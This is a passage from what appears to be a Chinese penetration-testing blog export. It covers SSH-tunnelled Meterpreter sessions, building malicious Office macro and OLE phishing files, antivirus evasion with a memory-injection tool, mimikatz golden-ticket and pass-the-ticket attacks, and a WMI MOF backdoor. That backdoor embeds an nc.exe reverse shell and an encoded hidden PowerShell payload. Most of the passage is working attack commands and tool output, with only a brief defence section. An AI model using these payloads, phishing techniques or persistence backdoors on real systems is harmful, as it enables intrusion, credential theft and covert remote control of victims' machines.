    <content type="text"><![CDATA[这里首先需要配置VPS ssh服务编辑 /etc/ssh/sshd_config在文件最后添加： GatewayPorts yes 重启ssh服务之后配置msf客户端:1msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=[vpsIP] LPORT=8888 -f exe &gt; abc.exe 之后本地启用监听：12345678910111213msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set lhost 192.168.2.100lhost =&gt; 192.168.2.100msf exploit(handler) &gt; set lport 8888lport =&gt; 8888msf exploit(handler) &gt; set exitonsession falseexitonsession =&gt; falsemsf exploit(handler) &gt; exploit -j[*] Exploit running as background job.[*] Started reverse TCP handler on 192.168.2.100:8888 开启ssh隧道：1ssh -N -R 8888:192.168.2.100:8888 echo@evi1cg.me 客户端被执行以后，成功返回回话：]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>tunnel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Office Phishing]]></title>
    <url>%2Farchives%2FOffice_Phishing.html</url>
    <content type="text"><![CDATA[Office作为Windows平台下一种非常流行的办公软件，越来越多的APT攻击通过构造恶意Office文件来进行实施，这也是成功率也是比较高的一种攻击方式。当然最隐蔽，最有效的攻击方式就是通过Office办公套件的一些0day来实施攻击，但是这也同样存在一些弊端，首先不是所有人都拥有0day，其次那些已经公布的Xday可能只能针对某些固定版本的Office，所以本文重点不在如果使用Xday，而是对现在已知的一些构造Office Phishing File的方式及方法进行总结，希望对学习Hack的同学有所帮助，当然也希望，通过此文，小伙伴能避免遭受此类攻击。 0x00 Office 宏宏是微软公司为其OFFICE软件包设计的一个特殊功能，软件设计者为了让人们在使用软件进行工作时，避免一再地重复相同的动作而设计出来的一种工具，它利用简单的语法，把常用的动作写成宏，当在工作时，就可以直接利用事先编好的宏自动运行，去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。但是宏在提供方便的同时，也存在很大的风险，其危害在Freebuf上也有过相关文章：《MWI-5：利用Office宏下载键盘记录器的攻击活动分析》，下文将会介绍几个知名工具构造宏后门的方式。 1、 Veil测试使用powershell/shellcode_inject/virtual，选择以后直接generate 随便输入一个名字之后成功生成： 然后需要下载一个转换脚本：1☁ office git clone https://github.com/khr0x40sh/MacroShop.git 使用下载的python脚本转换为VBA脚本：1root@kali:~/script/MacroShop# python macro_safe.py /usr/share/veil-output/source/test.bat 之后将生成的内容添加到OFFice文件宏里面。创建宏，注意选择宏的位置为当前文档: 接下来选择Project 下面的Microsoft Word对象，选择Document-&gt;open,然后将生成的代码粘进去。要保存的代码如下图 这里注意一点，脚本生成的默认是打开表格的宏，所以，这里只要函数内容，注意打钩的。 之后保存为启用宏的Word文档或者doc文档。 开启监听：1root@kali:~/Veil-Evasion# msfconsole -r /usr/share/veil-output/handlers/test_handler.rc 打开word文档会有此提示： 点击启用，则生成meterpreter会话。 2、 Nishangnishang的使用早在《使用powershell Client进行有效钓鱼》 有所介绍，有兴趣的小伙伴可以再去看看。 3、 Metasploit作为一个神器，Msf当然也可以生成VBA的后门文件，具体命令如下：1☁ ~ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.100 lport=8888 -e x86/shikata_ga_nai exitfunc=thread -f vba &gt; vcode.txt 4、 Empire123456789(Empire) &gt; listeners[!] No listeners currently active (Empire: listeners) &gt; execute(Empire: listeners) &gt; usestager macro(Empire: stager/macro) &gt; set Listener test(Empire: stager/macro) &gt; set OutFile /tmp/macro.txt(Empire: stager/macro) &gt; execute[*] Stager output written out to: /tmp/macro.txt 将代码写入宏，执行可成功返回会话： 5、 Scripts1☁ office git clone https://github.com/enigma0x3/Generate-Macro.git 使用方式如下：123456789101112131415161718192021PS C:\Users\Evi1cg\Desktop&gt; . .\Generate-Macro.ps1Enter URL of Invoke-Shellcode script (If you use GitHub, use the raw version): https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-Shellcode.ps1Enter IP Address: 192.168.2.111Enter Port Number: 6666Enter the name of the document (Do not include a file extension): Macro--------Select Attack---------1. Meterpreter Shell with Logon Persistence2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin)3. Meterpreter Shell with Alternate Data Stream Persistence4. Meterpreter Shell with Scheduled Task Persistence------------------------------Select Attack Number &amp; Press Enter: 1--------Select Payload---------1. Meterpreter Reverse HTTPS2. Meterpreter Reverse HTTP------------------------------Select Payload Number &amp; Press Enter: 2Saved to file C:\Users\Evi1cg\Desktop\Macro.xlsClean-up Script located at C:\Users\Evi1cg\Desktop\RegistryCleanup.ps1 运行Excel以后则生成meterpreter会话： 同时生成自启动后门： 具体键值为HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load 清除后门可以使用如下命令：12345PS C:\Users\Evi1cg\Desktop&gt; . .\RegistryCleanup.ps1[*]Successfully Removed config.vbs from C:\Users\Public[*]Successfully Removed Malicious Load entry from HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows[!]Path not valid[!]Path not valid 具体其他后门的使用，有兴趣的小伙伴可是自己实践一下。 其他Macro后门相关的脚本如下： Old-Powershell-payload-Excel-Delivery OutlookPersistence exe2vba.rb unicorn 0x01 Office OLEOLE是Object Linking and Embedding的缩写，即“对象链接与嵌入”，这是一种把一个文件的一部分嵌入到另一个文件之中的技术，此类攻击方式也被常常应用于APT中，其有一个好处就是不需要用户开启宏，及在禁用宏的情况下执行命令。 1、 Outlook OLE@三好学生之前在Zone里面曾经有一个介绍：Outlook OLE 钓鱼邮件利用介绍，本人在win10+offcie2016下作了测试，在这里做一下简单的介绍，制作此钓鱼文件步骤如下：1、新建邮件，在设置文本格式处选择RTF：2、选择插入-&gt;对象-&gt;Package，选择显示为图标：3、然后将图标换为Word图标，并修改题注为迷惑性名称：4、绑定指定程序或脚本；5、将RTF再改为HTML ；6、添加其他迷惑内容 ：7、保存为test.msg ；8、发送给受害者。受害者运行以后会有以下提示：点击是以后会弹：点击打开，成功执行： 2、 PowerPoint OLE通过PowerPoint演示文稿进行Phishing，同样不需要启用宏，制作步骤如下：1、创建新的PowerPoint文件；2、创建VBS脚本，为了简单演示，只写了一个弹框：1Msgbox("test") 3、将VBS拖入PPT；4、为VBS添加动画-&gt;OLE操作动作并选择激活，如下图：5、选择动画窗格-&gt;效果选项：6、选择计时-&gt;与上一动画同时：7、为PPT添加内容；8、另存为放映文件pps或者ppsx；9、发送给受害者。 受害者打开会弹出如下提示框：点击打开，执行脚本。 对于VBS后门，本文就不再详细描述怎么制作了，很多姿势小伙伴们可以自己搜集一下，比较好玩儿的请参考:JavaScript Phishing 对于VBS脚本可以使用这个脚本来进行加密：ncode-and-Decode-a-VB 0x02 防御关于通过Office宏或者OLE对象进行的攻击从90年代开始了，然而现在还在利用中，如何更好地防御此类攻击呢？1、你可以教育你的员工不要点启用宏，不要随便乱点确定，不要随便下载不明文件等。2、配置组策略，如果在域下，可以批量配置管理模板。设置 Disable all except digitally signed macros： 更多细节请看这里 3、对于.msg、.rtf、.pps 后缀的文件要格外注意；4、采用EMET，如果你不知道EMET是什么，可以看这里。 以上方法来自于it-s-time-to-secure-microsoft-office，关于规划Office的VBA宏的安全设置请看这里.aspx)。 0x03 小结使用Office进行APT攻击的情形越来越多，在没有0day的情况下，我们应该至少对于以上类型的钓鱼攻击进行了解及防范，以上为个人所了解的几种构造Office钓鱼文件的方式，可能并不全面，如果小伙伴还有别的姿势，请不吝赐教。 0x04 参考 http://phishme.com/powerpoint-and-custom-actions/ http://zone.wooyun.org/content/24657 https://medium.com/@networksecurity/oleoutlook-bypass-almost-every-corporate-security-control-with-a-point-n-click-gui-37f4cbc107d0#.92vne7zgd https://www.youtube.com/watch?v=xm4PwyPCacw https://www.youtube.com/watch?v=j0CnVokavtI]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>office</tag>
        <tag>phishing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows domain credentials phishing tool]]></title>
    <url>%2Farchives%2Fwindows-domain-credentials-phishing-tool.html</url>
    <content type="text"><![CDATA[下载地址：戳我 DEMO: http://player.vimeo.com/video/89782344?portrait=0&amp;color=c9ff23]]></content>
      <categories>
        <category>工具收集</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bypassAV_hanzoInjection]]></title>
    <url>%2Farchives%2FbypassAV_hanzoInjection.html</url>
    <content type="text"><![CDATA[下载hanzoInjection1git clone https://github.com/P0cL4bs/hanzoInjection.git 使用方式：1234567891011121314151617181920212223242526sage: HanzoInjection.exe [Options] [-h] [-e] [-o] [-p] [-b]the HanzoIjection is a tool focused on injecting arbitrary codes in memory to bypass common antivirus solutions. Developer: Mharcos Nesster (mh4x0f)Email:mh4root@gmail.comSite: www.chmodsecurity.com.brGreetx: P0cL4bs Team &#123; N4sss , MMXM , Chrislley, MovCode, joridos &#125; -------------------------------------------------------------------Arguments Options: OPTION TYPE DESCRIPTION -e,--execute [.raw] Name of file.bin, payload metasploit type raw -p,--payload [.raw] Payload meterpreter type [RAW] requered parameter -o [output] -o,--output [file.cs] Output generate project file.cs injection memory payload c# -b,--binder [NULL] Binder File EXE with encrypt file PE not requered paramenter -h,--help [Help] show this help and exitExample Usage: HanzoInjection.exe -e payload_meterpreter.bin HanzoInjection.exe -p meterpreter.bin -o injection_memory.cs HanzoInjection.exe -b 生成paylaod1☁ ~ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.100 lport=4444 -f raw -o ~/Desktop/test.bin 检测： 使用hanzoInjection生成cs:1☁ hanzoInjection [master] wine HanzoInjection.exe -p ~/Desktop/test.bin -o ~/Desktop/test.cs 之后使用vs编译cs： 如果出现错误，修改编译器允许不安全代码。 生成的文件检测结果: 虽然还有报毒，但是已经可以过很多杀软了。测试可以上线：]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Domain Administrator in 17 seconds]]></title>
    <url>%2Farchives%2FDomain_Administrator_in_17_seconds.html</url>
    <content type="text"><![CDATA[https://github.com/gojhonny/CredCrack]]></content>
      <categories>
        <category>工具收集</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Kerberos]]></title>
    <url>%2Farchives%2FKerberos.html</url>
    <content type="text"><![CDATA[Kerberos Modules12345678910111213141516171819202122232425 .#####. mimikatz 2.0 alpha (x64) release "Kiwi en C" (Oct 9 2015 00:33:13) .## ^ ##. ## / \ ## /* * * ## \ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo) '#####' with 16 modules * * */mimikatz # kerberos::ERROR mimikatz_doLocal ; "(null)" command of "kerberos" module not found !Module : kerberosFull name : Kerberos package moduleDescription : ptt - Pass-the-ticket [NT 6] list - List ticket(s) tgt - Retrieve current TGT purge - Purge ticket(s) golden - Willy Wonka factory hash - Hash password to keys ptc - Pass-the-ccache [NT6] clist - List tickets in MIT/Heimdall ccachemimikatz # Golden Ticket1234567891011121314151617181920mimikatz # kerberos::golden /user:Administrator /domain:sittingduck.info /sid:S-1-5-21-2792304509-1851296738-3446580569 /krbtgt:994ceb7e251e5afc550eef79d8172d64 /ticket:gold.kirbiUser : AdministratorDomain : sittingduck.infoSID : S-1-5-21-2792304509-1851296738-3446580569User Id : 500Groups Id : *513 512 520 518 519ServiceKey: 994ceb7e251e5afc550eef79d8172d64 - rc4_hmac_ntLifetime : 10/26/2015 11:28:54 PM ; 10/23/2025 11:28:54 PM ; 10/23/2025 11:28:54 PM-&gt; Ticket : gold.kirbi * PAC generated * PAC signed * EncTicketPart generated * EncTicketPart encrypted * KrbCred generatedFinal Ticket Saved to file ! Pass the Ticket12345678910111213mimikatz # kerberos::ptt gold.kirbi 0 - File 'gold.kirbi' : OKmimikatz # kerberos::list[00000000] - 0x00000017 - rc4_hmac_nt Start/End/MaxRenew: 10/26/2015 11:28:54 PM ; 10/23/2025 11:28:54 PM ; 10/23/2025 11:28:54 PM Server Name : krbtgt/sittingduck.info @ sittingduck.info Client Name : Administrator @ sittingduck.info Flags 40e00000 : pre_authent ; initial ; renewable ; forwardable ;mimikatz # Injecting tickets with Kirbikator12345678910111213C:\Users\notanadmin\Desktop&gt;kirbikator.exe lsa gold.kirbi .#####. KiRBikator 1.0 (x86) release "Kiwi en C" (Feb 1 2015 03:37:29) .## ^ ##. ## / \ ## /* * * ## \ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## v ##' http://blog.gentilkiwi.com (oe.eo) '#####' * * */Destination : Microsoft LSA API (multiple) &lt; gold.kirbi (RFC KRB-CRED (#22)) &gt; Ticket Administrator@sittingduck.info-krbtgt~sittingduck.info@sittingduck.info : injected Exporting active tickets12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152mimikatz # kerberos::list /export[00000000] - 0x00000012 - aes256_hmac Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/2015 11:39:31 PM Server Name : krbtgt/SITTINGDUCK.INFO @ SITTINGDUCK.INFO Client Name : uberuser @ SITTINGDUCK.INFO Flags 60a10000 : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; * Saved to file : 0-60a10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi[00000001] - 0x00000012 - aes256_hmac Start/End/MaxRenew: 10/26/2015 11:39:31 PM ; 10/27/2015 9:39:31 AM ; 11/2/2015 11:39:31 PM Server Name : krbtgt/SITTINGDUCK.INFO @ SITTINGDUCK.INFO Client Name : uberuser @ SITTINGDUCK.INFO Flags 40e10000 : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; * Saved to file : 1-40e10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi[00000002] - 0x00000012 - aes256_hmac Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/2015 11:39:31 PM Server Name : cifs/dc1.sittingduck.info @ SITTINGDUCK.INFO Client Name : uberuser @ SITTINGDUCK.INFO Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; * Saved to file : 2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi[00000003] - 0x00000012 - aes256_hmac Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/2015 11:39:31 PM Server Name : ldap/dc1.sittingduck.info @ SITTINGDUCK.INFO Client Name : uberuser @ SITTINGDUCK.INFO Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; * Saved to file : 3-40a50000-uberuser@ldap~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi[00000004] - 0x00000012 - aes256_hmac Start/End/MaxRenew: 10/26/2015 11:39:31 PM ; 10/27/2015 9:39:31 AM ; 11/2/2015 11:39:31 PM Server Name : LDAP/dc1.sittingduck.info/sittingduck.info @ SITTINGDUCK.INFO Client Name : uberuser @ SITTINGDUCK.INFO Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; * Saved to file : 4-40a50000-uberuser@LDAP~dc1.sittingduck.info~sittingduck.info-SITTINGDUCK.INFO.kirbi PSEXEC with standard Kerberos tickets1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253mimikatz # kerberos::listmimikatz # (EMPTY LIST)mimikatz # kerberos::ptt 1-40e10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi 0 - File '1-40e10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi': OKmimikatz # kerberos::ptt 2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi 0 - File '2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi' : OKmimikatz # kerberos::list[00000000] - 0x00000012 - aes256_hmac Start/End/MaxRenew: 10/26/2015 11:39:31 PM ; 10/27/2015 9:39:31 AM ; 11/2/2015 11:39:31 PM Server Name : krbtgt/SITTINGDUCK.INFO @ SITTINGDUCK.INFO Client Name : uberuser @ SITTINGDUCK.INFO Flags 40e10000 : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;[00000001] - 0x00000012 - aes256_hmac Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/2015 11:39:31 PM Server Name : cifs/dc1.sittingduck.info @ SITTINGDUCK.INFO Client Name : uberuser @ SITTINGDUCK.INFO Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;mimikatz #C:\Users\notanadmin\Desktop&gt;psexec \\dc1 cmd.exePsExec v1.97 - Execute processes remotelyCopyright (C) 2001-2009 Mark RussinovichSysinternals - www.sysinternals.comMicrosoft Windows [Version 6.3.9600](c) 2013 Microsoft Corporation. All rights reserved.C:\Windows\system32&gt;whoamisittingduck\uberuserC:\Windows\system32&gt;echo %COMPUTERNAME%DC1C:\Windows\system32&gt; Convert Mimikatz Kerberos ticket to CCache and use12345678910111213141516C:\Users\notanadmin\Desktop&gt;kirbikator.exe ccache "2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi" .#####. KiRBikator 1.0 (x86) release "Kiwi en C" (Feb 1 2015 03:37:29) .## ^ ##. ## / \ ## /* * * ## \ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## v ##' http://blog.gentilkiwi.com (oe.eo) '#####' * * */Destination : MIT Credential Cache (simple) &lt; 2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi (RFC KRB-CRED (#22)) &gt; Single file : uberuser@SITTINGDUCK.INFO.ccacheC:\Users\notanadmin\Desktop&gt; Method 1123KRB5CCNAME=uberuser@SITTINGDUCK.INFO.ccache smbclient -k //dc1.sittingduck.info/c$OS=[Windows Server 2012 R2 Standard 9600] Server=[Windows Server 2012 R2 Standard 6.3]smb: \&gt; Method 212345678910111213141516171819202122232425root@kali:~# apt-get install krb5-userReading package lists... DoneBuilding dependency tree Reading state information... DoneThe following extra packages will be installed: krb5-config libgssrpc4 libkadm5clnt-mit9 libkadm5srv-mit9 libkdb5-7Suggested packages: krb5-docThe following NEW packages will be installed: krb5-config krb5-user libgssrpc4 libkadm5clnt-mit9 libkadm5srv-mit9 libkdb5-70 upgraded, 6 newly installed, 0 to remove and 0 not upgraded.Need to get 466 kB of archives.After this operation, 1,199 kB of additional disk space will be used.Do you want to continue? [Y/n] y0% [Connecting to http.kali.org]&lt;SNIP&gt;&lt;SNIP&gt;&lt;SNIP&gt;root@kali:~/Desktop# klistklist: Credentials cache file '/tmp/krb5cc_0' not foundroot@kali:~/Desktop# cp uberuser@SITTINGDUCK.INFO.ccache /tmp/krb5cc_0root@kali:~/Desktop# smbclient -k //dc1.sittingduck.info/c$OS=[Windows Server 2012 R2 Standard 9600] Server=[Windows Server 2012 R2 Standard 6.3]smb: \&gt;]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>mimikatz</tag>
        <tag>kerberos</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Powershell之MOF后门]]></title>
    <url>%2Farchives%2FPowershell_MOF_Backdoor.html</url>
    <content type="text"><![CDATA[0x00 MOFManaged Object Format (MOF)是WMI数据库中类和类实例的原始保存形式。具体介绍可以阅读《WMI 的攻击，防御与取证分析技术之防御篇》，Windows 管理规范 (WMI) 提供了以下三种方法编译到WMI存储库的托管对象格式 (MOF) 文件： 方法 1： 使用Mofcomp.exe。 方法 2： 使用 IMofCompiler 接口和 $ CompileFile 方法。 方法 3： 拖放到%SystemRoot%\System32\Wbem\MOF文件夹的 MOF 文件。 第三种方法仅为向后兼容性与早期版本（win2003）的 WMI 提供。 一个简单的MOF反弹shell示例：123456789101112131415161718192021222324252627#pragma namespace ("\\\\.\\root\\subscription")instance of __EventFilter as $FILTER&#123; Name = "CLASS_FIRST_TEST"; EventNamespace = "root\\cimv2"; Query = "SELECT * FROM __InstanceCreationEvent " "WHERE TargetInstance ISA \"Win32_NTLogEvent\" AND " "TargetInstance.LogFile=\"Application\""; QueryLanguage = "WQL";&#125;;instance of ActiveScriptEventConsumer as $CONSUMER&#123; Name = "CLASS_FIRST_TEST"; ScriptingEngine = "VBScript"; ScriptText = "Set objShell = CreateObject(\"WScript.Shell\")\n" "objShell.Run \"C:\\Windows\\system32\\cmd.exe /C C:\\nc.exe 192.168.38.1 1337 -e C:\\Windows\\system32\\cmd.exe\"\n";&#125;;instance of __FilterToConsumerBinding&#123; Consumer = $CONSUMER ; Filter = $FILTER ;&#125;; 0x01 MOF and Powershell如果获取了管理员权限，使用MOF可以做一个永久的隐藏后门。对于很多后门来说，都需要一个触发，在这里，可以使用WMI Query Language(WQL)来查询事件，以便确定什么时候触发我们的后门。（更多详细的解释可在查看戳我，戳我)。比如，我们想做一个后门通过打开notepad来触发，可以使用以下查询：123"SELECT * FROM __InstanceCreationEvent Within 5 " "Where TargetInstance Isa \"Win32_Process\" " "And Targetinstance.Name = \"notepad.exe\" "; 如果想通过关闭Powershell来触发，可以使用以下查询：123"SELECT * FROM __InstanceDeletionEvent Within 5 " "Where TargetInstance Isa \"Win32_Process\" " "And Targetinstance.Name = \"powershell.exe\" "; 如果想通过每小时在30分钟的时候触发，可使用以下查询：123"Select * From __InstanceModificationEvent " "Where TargetInstance Isa \"Win32_LocalTime\" " "And TargetInstance.Minute = 30 " 当我们确定了我们的触发方式以后，我们就可以把我们的查询写成一个MOF过滤器：1234567instance of __EventFilter as $Filt&#123; Name = "EventFilter"; EventNamespace = "Root\\Cimv2"; Query = &lt;插入查询&gt; QueryLanguage = "WQL";&#125;; 比如我们使用打开Notepad作为触发条件，那么可以这样写：123456789instance of __EventFilter as $Filt&#123; Name = "EventFilter"; EventNamespace = "Root\\Cimv2"; Query ="SELECT * FROM __InstanceCreationEvent Within 5" "Where TargetInstance Isa \"Win32_Process\" " "And Targetinstance.Name = \"notepad.exe\" "; QueryLanguage = "WQL";&#125;; 下面我们就需要事件消费者的响应了，在这里我们可以使用不同的EventConsumer.aspx?tduid=(c301fb77b3a8b885de2b9a1f7456c5ac)(256380)(2459594)(TnL5HPStwNw-ektmYir908cxwICjxz7cAg)())类，通过使用CommandLineEventConsumer，我们可以使用Veil输出的payload，同时也可以使用ActiveScriptEventConsumer来嵌入或者调用VBS脚本。下面是一个使用CommandLineEventConsumer的示例：1"cmd /C [data here]"; 下面使用Veil来生成Powershell payload: 选择x86里面进行测试，payload如下：1powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVPbTttAEH33V4wsS9iKbTkXaAhC4qa0SG2KCGofojw4m4FsWe9a63FiQ/PvHYPTFkSrqk/H3p0558xlPQHHcOI6swulLrPcWPLde7QaVb8XL5Vygznk5UJJAQWlxIAV8T1caroiC1+kpTJVp0oZ4bdnmxBKqQmqFusWH4Kj/9Y5t5gS3qwYljudsuVdh/BLuf36Tbs9adTdE4ds/egVXPQEN9HnxTcUBNO6IMziCVI8NeIeqWgR/Nkbd6fLpcWiGKeZVPV8NGIBtBywMfY+hLcynvGmzpHDp8RFZG8HXllDRhjVht6IPHC8Ij43WrNRf6972Iu7B8P43SDuDrp7IQyHw8MAvoMpKdKlUkfg5Vzc7NTatPH23LdLzU3VAn13URO6IQwCDqw4kMmvUaBco+/lr4ge+D5xvPof+GZnktjkGi23ojFuuCn9HnOGSdDZb9TqWTJvCKuzsbNZSYXgs0Kk6O/JATw2Tjovrdah99DZD7vhn7s9VuldwWwTozGArXNrLCvK4y57kayLMGi+Oh1WYHOebNzt6F45eo90xoUW/ox3as5GPqR6qTDgrKg73zoecS6vRdTMDaIMswXaC7yVWpI0GjwB0STNENyvUvd7LkSa/4o8FQhPJ+NSiyaygChPi4JWtmwGdOzRaPTiiSWhV8cfUd/RKkyqfpIkDIMkcHbOr0tNMsP4aSlNPkW7lgKL+FNqi1WqmhGavG46CAnP7flxzH2vindtD4IQforw+tFu6u3rY8XQq8IGkpcbM6XUUjRViDlEUxRGL2F4MEiSrUhJrB63PwA=\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();" 接下来，我们把上面的payload放到下面的模板中：123456instance of CommandLineEventConsumer as $Cons&#123; Name = "Powershell Helper"; RunInteractively=false; CommandLineTemplate="cmd /C powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVPbTttAEH33V4wsS9iKbTkXaAhC4qa0SG2KCGofojw4m4FsWe9a63FiQ/PvHYPTFkSrqk/H3p0558xlPQHHcOI6swulLrPcWPLde7QaVb8XL5Vygznk5UJJAQWlxIAV8T1caroiC1+kpTJVp0oZ4bdnmxBKqQmqFusWH4Kj/9Y5t5gS3qwYljudsuVdh/BLuf36Tbs9adTdE4ds/egVXPQEN9HnxTcUBNO6IMziCVI8NeIeqWgR/Nkbd6fLpcWiGKeZVPV8NGIBtBywMfY+hLcynvGmzpHDp8RFZG8HXllDRhjVht6IPHC8Ij43WrNRf6972Iu7B8P43SDuDrp7IQyHw8MAvoMpKdKlUkfg5Vzc7NTatPH23LdLzU3VAn13URO6IQwCDqw4kMmvUaBco+/lr4ge+D5xvPof+GZnktjkGi23ojFuuCn9HnOGSdDZb9TqWTJvCKuzsbNZSYXgs0Kk6O/JATw2Tjovrdah99DZD7vhn7s9VuldwWwTozGArXNrLCvK4y57kayLMGi+Oh1WYHOebNzt6F45eo90xoUW/ox3as5GPqR6qTDgrKg73zoecS6vRdTMDaIMswXaC7yVWpI0GjwB0STNENyvUvd7LkSa/4o8FQhPJ+NSiyaygChPi4JWtmwGdOzRaPTiiSWhV8cfUd/RKkyqfpIkDIMkcHbOr0tNMsP4aSlNPkW7lgKL+FNqi1WqmhGavG46CAnP7flxzH2vindtD4IQforw+tFu6u3rY8XQq8IGkpcbM6XUUjRViDlEUxRGL2F4MEiSrUhJrB63PwA=\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();";&#125;; 这里要注意一点就是如果payload里面存在需要转义的&quot;以及\ 这里可以使用双引号将其引用并用\进行转义。 最后我们所写的MOF文件是这样的：1234567891011121314151617181920212223242526272829303132#PRAGMA NAMESPACE ("\\\\.\\root\\subscription")instance of CommandLineEventConsumer as $Cons&#123; Name = "Powershell Helper"; RunInteractively=false; CommandLineTemplate="cmd /C powershell.exe -NoP -NonI -W Hidden" " -Exec Bypass -Command \"Invoke-Expression " "$(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String" "(\\\"nVPbTttAEH33V4wsS9iKbTkXaAhC4qa0SG2KCGofojw4m4FsWe9a63FiQ/PvHYPTFkSrqk/H3p0558xlPQHHcOI6swulLrPcWPLde7QaVb8XL5Vygznk5" "UJJAQWlxIAV8T1caroiC1+kpTJVp0oZ4bdnmxBKqQmqFusWH4Kj/9Y5t5gS3qwYljudsuVdh/BLuf36Tbs9adTdE4ds/egVXPQEN9HnxTcUBNO6IMziCVI8NeIeqWgR/" "Nkbd6fLpcWiGKeZVPV8NGIBtBywMfY+hLcynvGmzpHDp8RFZG8HXllDRhjVht6IPHC8Ij43WrNRf6972Iu7B8P43SDuDrp7IQyHw8MAvoMpKdKlUkfg5Vzc7NTatPH23LdLzU3VAn13" "URO6IQwCDqw4kMmvUaBco+/lr4ge+D5xvPof+GZnktjkGi23ojFuuCn9HnOGSdDZb9TqWTJvCKuzsbNZSYXgs0Kk6O/" "JATw2Tjovrdah99DZD7vhn7s9VuldwWwTozGArXNrLCvK4y57kayLMGi+Oh1WYHOebNzt6F45eo90xoUW/" "ox3as5GPqR6qTDgrKg73zoecS6vRdTMDaIMswXaC7yVWpI0GjwB0STNENyvUvd7LkSa/4o8FQhPJ+NSiyaygChPi4JWtmwGdOzRaPTiiSWhV8cfUd/" "RKkyqfpIkDIMkcHbOr0tNMsP4aSlNPkW7lgKL+FNqi1WqmhGavG46CAnP7flxzH2vindtD4IQforw+tFu6u3rY8XQq8IGkpcbM6XUUjRViDlEUxRGL2F4MEiSrUhJrB63PwA=\\\")))), " "[IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"";&#125;;instance of __EventFilter as $Filt&#123; Name = "EventFilter"; EventNamespace = "Root\\Cimv2"; Query ="SELECT * FROM __InstanceCreationEvent Within 5" "Where TargetInstance Isa \"Win32_Process\" " "And Targetinstance.Name = \"notepad.exe\" "; QueryLanguage = "WQL";&#125;;instance of __FilterToConsumerBinding &#123; Filter = $Filt; Consumer = $Cons;&#125;; 如果觉得麻烦的话，可以使用这个工具unicorn来生成没有特殊字符的payload，使用方式很简单:1☁ unicorn [master] python unicorn.py windows/meterpreter/reverse_tcp 192.168.74.141 8889 将powershell_attack.txt的内容复制进来，然后msfconsole -r unicorn.rc 则可开启监听,修改后的MOF文件如下：12345678910111213141516171819202122#PRAGMA NAMESPACE ("\\\\.\\root\\subscription")instance of CommandLineEventConsumer as $Cons&#123; Name = "Powershell Helper"; RunInteractively=false; CommandLineTemplate="cmd /C powershell -window hidden -enc 